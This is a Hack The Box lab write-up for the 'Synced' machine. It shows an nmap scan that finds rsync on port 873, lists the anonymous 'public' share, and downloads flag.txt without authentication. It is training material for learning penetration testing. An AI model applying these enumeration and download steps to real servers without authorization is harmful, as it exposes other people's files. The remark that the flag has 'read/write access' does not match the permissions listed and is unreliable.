```toc
```
# HTB Notes - Synced #

+ **Date**: 12-5-2022
+ **Author**: Noah Soqui
+ **Tags**: #Rsync

## Intelligence Gathering ##

Scanning the target:
+ `nmap -sV 10.129.228.37`
+ Output:
``` Shell
Nmap scan report for 10.129.228.37
Host is up (0.078s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

## Misconfiguration and Vulnerability Analysis  ##

The Rsync service allow null sessions, can download the flag without authentication.

## Exploitation ##

Will use the Rsync utility to see shares available:
``` Shell
$ rsync rsync://10.129.228.37 --list-only 
public          Anonymous Share
```

Then can look more into the share called "public":
``` Shell 
$ rsync rsync://10.129.228.37/public --list-only 
drwxr-xr-x          4,096 2022/10/24 17:02:23 .
-rw-r--r--             33 2022/10/24 16:32:03 flag.txt
```
+ Note that we see the flag is available and has read/write access 

## Post Exploitation ##

Download the flag in the location found:
+ `rsync rsync://10.129.228.37/public/flag.txt .` 

## Reporting ##

### Executive Summary ###

rsync is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers by comparing the modification times and sizes of files. Its default port is 873. Can us user name <mark style="background: #BBFABBA6;">None</mark> to authenticate anonymously. After finding the service, it is as simple as interacting with the <mark style="background: #FFB86CA6;">Rsync</mark> utility to find and download the flag.